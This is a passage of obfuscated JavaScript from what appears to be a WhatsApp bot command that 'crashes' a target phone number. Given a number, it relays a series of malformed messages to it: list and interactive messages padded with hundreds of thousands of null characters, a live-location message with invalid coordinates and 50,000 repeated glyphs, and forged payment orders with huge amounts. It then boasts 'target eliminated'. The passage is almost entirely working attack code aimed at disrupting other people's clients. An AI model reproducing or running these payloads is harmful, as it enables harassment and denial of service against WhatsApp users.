        buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍n꙲a꙲r꙲u꙲t꙲o꙲ ₵Ɽ₳₴Ⱨ̿╮⭑ ☠️⃰͜͡؜⃟ĕ̈d̆̈n̆̈ŭ̈t̆̈🔥᜴#Naruto999ཀ͜͡😈⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
      };
      const _0x15a433 = {
        buttons: [_0x14a0a1]
      };
      const _0x568b32 = {
        'key': _0x41df82,
        'message': {
          'interactiveMessage': {
            'header': {
              'hasMediaAttachment': true,
              'jpegThumbnail': fs.readFileSync("./lib/Hamza.png")
            },
            'nativeFlowMessage': _0x15a433
          }
        }
      };
      const _0x941e60 = {
        remoteJid: "status@broadcast"
      };
      const _0x488eaf = {
        'participant': "0@s.whatsapp.net",
        ...(_0x3ae037.chat ? _0x941e60 : {})
      };
      const _0x49b8cd = {
        name: "review_and_pay",
        buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍Ê̬d̬̂n̬̂û̬t̂👹̬ s͓̽a͓̽y͓̽s͓̽╮⭑ ☠️⃰w҉a҉g҉w҉a҉n҉ t҉o҉ y҉o҉u҉r҉͜͡؜🔥᜴₥Ʉ₥#ཀ͜͡😈⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
      };
      const _0x455040 = {
        buttons: [_0x49b8cd]
      };
      const _0x56fa76 = {
        'key': _0x488eaf,
        'message': {
          'interactiveMessage': {
            'header': {
              'hasMediaAttachment': true,
              'jpegThumbnail': fs.readFileSync("./lib/Hamza.png")
            },
            'nativeFlowMessage': _0x455040
          }
        }
      };
      async function _0x580888(_0x4fd96c, _0x52e57c) {
        const _0x589049 = {
          product_header_info_id: 0x4433e2e130
        };
        _0x589049.product_header_is_rejected = false;
        var _0x385358 = generateWAMessageFromContent(_0x4fd96c, proto.Message.fromObject({
          'listMessage': {
            'title': "⟠ TALKDROVE ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々" + "\0".repeat(920000),
            'footerText': "✳️᜴࿆͆᷍𝓮𝓭𝓷𝓾𝓽 𝓼𝓾𝓹𝓮𝓻 𝔁 𝓬𝓻𝓪𝓼𝓱𝓿ཀ͜͡😈⃟╮.xp",
            'description': "✳️᜴࿆͆᷍𝓮𝓭𝓷𝓾𝓽 𝓼𝓾𝓹𝓮𝓻 𝔁 𝓬𝓻𝓪𝓼𝓱😈⃟╮.xp",
            'buttonText': null,
            'listType': 0x2,
            'productListInfo': {
              'productSections': [{
                'title': "anjay",
                'products': [{
                  'productId': "4392524570816732"
                }]
              }],
              'productListHeaderImage': {
                'productId': "4392524570816732",
                'jpegThumbnail': null
              },
              'businessOwnerJid': "0@s.whatsapp.net"
            }
          },
          'footer': "puki",
          'contextInfo': {
            'expiration': 0x93a80,
            'ephemeralSettingTimestamp': "1679959486",
            'entryPointConversionSource': "global_search_new_chat",
            'entryPointConversionApp': "whatsapp",
            'entryPointConversionDelaySeconds': 0x9,
            'disappearingMode': {
              'initiator': "INITIATED_BY_ME"
            }
          },
          'selectListType': 0x2,
          'product_header_info': _0x589049
        }), {
          'userJid': _0x4fd96c,
          'quoted': _0x2402d0
        });
        await _0x4eb8ce.relayMessage(_0x4fd96c, _0x385358.message, {
          'participant': {
            'jid': _0x4fd96c
          },
          'messageId': _0x385358.key.id
        });
      }
      async function _0x3f37d8(_0x4844ec, _0x37abef) {
        var _0x2aa2a3 = generateWAMessageFromContent(_0x4844ec, proto.Message.fromObject({
          'viewOnceMessage': {
            'message': {
              'liveLocationMessage': {
                'degreesLatitude': 'p',
                'degreesLongitude': 'p',
                'caption': "✳️࿆᷍🥷᜴͆𝑵𝒂𝒓𝒖𝒕𝒐༄ ❞𝒗𝒊𝒕𝒂𝒍ׁׅ֮̿╮⭑ ☠️⃰͜͡𝒄𝒓𝒂𝒔𝒉𝒙𝒙🔥᜴▴𝓮𝓭𝓷𝓾𝓽 𝓫𝓾𝓰😈⃟╮.xp" + 'ꦾ'.repeat(50000),
                'sequenceNumber': '0',
                'jpegThumbnail': ''
              }
            }
          }
        }), {
          'userJid': _0x4844ec,
          'quoted': _0x37abef
        });
        await _0x4eb8ce.relayMessage(_0x4844ec, _0x2aa2a3.message, {
          'participant': {
            'jid': _0x4844ec
          },
          'messageId': _0x2aa2a3.key.id
        });
      }
      async function _0x5c9136(_0x3d9e74, _0x558b0f) {
        const _0x1a27f6 = {
          upload: _0x4eb8ce.waUploadToServer
        };
        const _0x18e739 = {
          text: ''
        };
        var _0x19b5ba = generateWAMessageFromContent(_0x3d9e74, proto.Message.fromObject({
          'interactiveMessage': {
            'header': {
              'title': "🩸⃟༑⌁⃰₦₳ⱤɄ₮Ø ฿Ø₮ ₵Ɽ₳₴ⱧɆⱤ🦠",
              'hasMediaAttachment': true,
              ...(await prepareWAMessageMedia({
                'image': {
                  'url': "https://raw.githubusercontent.com/HyHamza/HyHamza/main/Images/XByte-logo.png"
                }
              }, _0x1a27f6))
            },
            'body': _0x18e739,
            'footer': {
              'text': "›          #Ednutcrash"
            },
            'nativeFlowMessage': {
              'messageParamsJson': "\0".repeat(1000000)
            }
          }
        }), {
          'userJid': _0x3d9e74,
          'quoted': _0x558b0f
        });
        await _0x4eb8ce.relayMessage(_0x3d9e74, _0x19b5ba.message, {
          'participant': {
            'jid': _0x3d9e74
          },
          'messageId': _0x19b5ba.key.id
        });
      }
      async function _0x47989e(_0x1ce7de, _0x4ae0df) {
        var _0x1312e4 = generateWAMessageFromContent(_0x1ce7de, proto.Message.fromObject({
          'stickerMessage': {
            'url': "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
            'fileSha256': "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
            'fileEncSha256': "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
            'mediaKey': "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
            'mimetype': "image/webp",
            'directPath': "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
            'fileLength': "10116",
            'mediaKeyTimestamp': "1715876003",
            'isAnimated': false,
            'stickerSentTs': "1715881084144",
            'isAvatar': false,
            'isAiSticker': false,
            'isLottie': false
          }
        }), {
          'userJid': _0x1ce7de,
          'quoted': _0x4ae0df
        });
        await _0x4eb8ce.relayMessage(_0x1ce7de, _0x1312e4.message, {
          'participant': {
            'jid': _0x1ce7de
          },
          'messageId': _0x1312e4.key.id
        });
      }
      let _0x514fef = _0x362728.replace(/[^0-9]/g, '');
      if (_0x514fef.startsWith('0')) {
        return _0x359529("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x7c6c01 + " 6283123456789");
      }
      let _0x551b9d = _0x514fef + "@s.whatsapp.net";
      await _0x359529("</> crash by Hamza... ");
      for (let _0x5dd4a4 = 0; _0x5dd4a4 < 1; _0x5dd4a4++) {
        await _0x580888(_0x551b9d, _0x2402d0);
        await _0x3f37d8(_0x551b9d, _0x568b32);
        await _0x5c9136(_0x551b9d, _0x2402d0);
        await _0x3f37d8(_0x551b9d, _0x568b32);
        await _0x47989e(_0x551b9d, _0x56fa76);
        await _0x3f37d8(_0x551b9d, _0x568b32);
      }
      await _0x359529("𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 " + _0x551b9d + " 𝒖𝒔𝒊𝒏𝒈 " + _0x7c6c01 + ".ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀.");
      const _0x3a6613 = {
        text: '✅️',
        key: _0x5e9dac.key
      };
      const _0x3b9a98 = {
        react: _0x3a6613
      };
      _0x4eb8ce.sendMessage(_0x33ae7b, _0x3b9a98);
    } catch (_0x5938f7) {
      _0x359529("an error occurred while executing the command contact the Hamza developer!");
      _0x3a5dfd(_0x5938f7);
    }
  });